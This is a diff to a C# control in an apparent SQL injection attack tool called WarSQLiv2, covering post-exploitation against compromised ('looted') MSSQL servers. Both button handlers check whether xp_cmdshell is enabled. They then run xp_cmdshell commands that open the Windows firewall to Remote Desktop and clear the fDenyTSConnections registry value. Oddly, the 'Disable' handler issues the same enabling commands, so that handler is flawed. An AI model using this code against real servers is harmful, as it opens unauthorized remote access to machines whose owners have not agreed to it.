@@ -87,70 +87,132 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
         }
         private void btnEnable_Click(object sender, RoutedEventArgs e)
         {
-            if (lstLooted.SelectedIndex != -1)
+            var isActivated = cmdControl.isActivated;
+            var isExecuted = cmdControl.isExecuted;
+            if (isActivated == false && isExecuted == false)
             {
+                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                 try
                 {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    Dispatcher.Invoke((Action)delegate
                     {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        var rdpCommand = string.Empty;
-                        rdpCommand += "USE [master]\r\n";
-                        rdpCommand += "EXEC xp_cmdshell 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes';\r\n";
-                        rdpCommand += "EXEC xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';";
-                        _postExploitation.ExploitCode = rdpCommand;
-                        _postExploitation.RunExploit();
-                        txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
+                        enableXpCmdShell.XpCmdShellStatus();
+                        txtStatus.AppendText(enableXpCmdShell.Result);
+                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                        if (contains == true)
+                        {
+                            isActivated = true;
+                            isExecuted = true;
+                        }
                     });
                 }
-                catch (Exception exp)
+                catch (Exception)
                 {
                     Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                     {
-                        txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
+                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                     });
                 }
             }
-            else
+            if (isExecuted == true && isActivated == true)
             {
-                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                if (lstLooted.SelectedIndex != -1)
                 {
-                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
-                });
+                    try
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            var rdpCommand = string.Empty;
+                            rdpCommand += "USE [master]\r\n";
+                            rdpCommand += "EXEC xp_cmdshell 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes';\r\n";
+                            rdpCommand += "EXEC xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';";
+                            _postExploitation.ExploitCode = rdpCommand;
+                            _postExploitation.RunExploit();
+                            txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
+                        });
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
+                        });
+                    }
+                }
+                else
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
+                    });
+                }
             }
         }
         private void btnDisable_Click(object sender, RoutedEventArgs e)
         {
-            if (lstLooted.SelectedIndex != -1)
+            var isActivated = cmdControl.isActivated;
+            var isExecuted = cmdControl.isExecuted;
+            if (isActivated == false && isExecuted == false)
             {
+                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                 try
                 {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    Dispatcher.Invoke((Action)delegate
                     {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        var rdpCommand = string.Empty;
-                        rdpCommand += "USE [master]\r\n";
-                        rdpCommand += "EXEC xp_cmdshell 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes';\r\n";
-                        rdpCommand += "EXEC xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';";
-                        _postExploitation.ExploitCode = rdpCommand;
-                        _postExploitation.RunExploit();
-                        txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
+                        enableXpCmdShell.XpCmdShellStatus();
+                        txtStatus.AppendText(enableXpCmdShell.Result);
+                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                        if (contains == true)
+                        {
+                            isActivated = true;
+                            isExecuted = true;
+                        }
                     });
                 }
-                catch (Exception exp)
+                catch (Exception)
                 {
                     Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                     {
-                        txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
+                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                     });
                 }
             }
-            else
+            if (isExecuted == true && isActivated == true)
             {
-                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                if (lstLooted.SelectedIndex != -1)
                 {
-                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
-                });
+                    try
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            var rdpCommand = string.Empty;
+                            rdpCommand += "USE [master]\r\n";
+                            rdpCommand += "EXEC xp_cmdshell 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes';\r\n";
+                            rdpCommand += "EXEC xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';";
+                            _postExploitation.ExploitCode = rdpCommand;
+                            _postExploitation.RunExploit();
+                            txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
+                        });
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
+                        });
+                    }
+                }
+                else
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
+                    });
+                }
             }
         }
     }
